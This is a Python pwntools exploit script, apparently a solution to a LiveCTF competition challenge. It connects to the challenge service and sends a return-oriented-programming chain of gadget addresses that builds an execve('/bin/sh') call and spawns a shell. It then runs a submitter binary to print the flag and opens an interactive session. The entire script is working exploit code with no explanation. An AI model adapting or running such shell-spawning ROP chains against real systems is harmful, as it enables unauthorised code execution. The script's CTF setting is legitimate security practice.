from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
p = remote(HOST, int(PORT))
# p = process("./handout/challenge")
context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']
# gdb.attach(p)
# subprocess.run("tmux split -h sudo gdb -p $(ps -ef | grep '00:00:00\ /home/livectf/challenge' | awk '{print $2;}')", shell=True)

rax_ppppppr = b"431010"
rdi_pr = b"402218"
add_eax_edi = b"471886"
xchg_eax_esi = b"436488"
add_edi_esi = b"493943"
pp_jmprax = b"441710"
ret = b"401814"
add_eax_esi = b"413068"
rsi_ppr = b"402216"
add_eax_ebp = b"499066"
xor_eax = b"404782"
payload = [
    b"1",
    b"1",
    b"1",
    b"0000000400000000",    
    
    rax_ppppppr,
    b"0000000000410468", b"1", b"1", b"1", b"1", b"1", b"1",
    rdi_pr,
    b"0000000000090090", b"1", 
    add_eax_edi,
    xchg_eax_esi, # esi = binsh
    
    rdi_pr, 
    b"1", b"1",
    rax_ppppppr,
    b"0000000000405050", b"1", b"1", b"1", b"1", b"1", b"1",
    add_edi_esi, # rdi = "/bin/sh"
    
    
    # esi = 0 
    xor_eax, 
    xchg_eax_esi, # eax = 0, esi = "/bin/sh"
    
    # execve("/bin/sh", 0, 0) 
    rax_ppppppr,
    b"0000000000479210", b"1", b"1", b"1", b"1", b"1", b"0000000000006000", # rbp = 0x6000
    add_eax_ebp
]

for data in payload:
    p.sendlineafter(b"pls: ", data)
p.sendlineafter(b"pls: ", b"0")
p.sendline(b"./submitter")
p.recvuntil(b"Flag: ")
print(p.recvline())

p.interactive()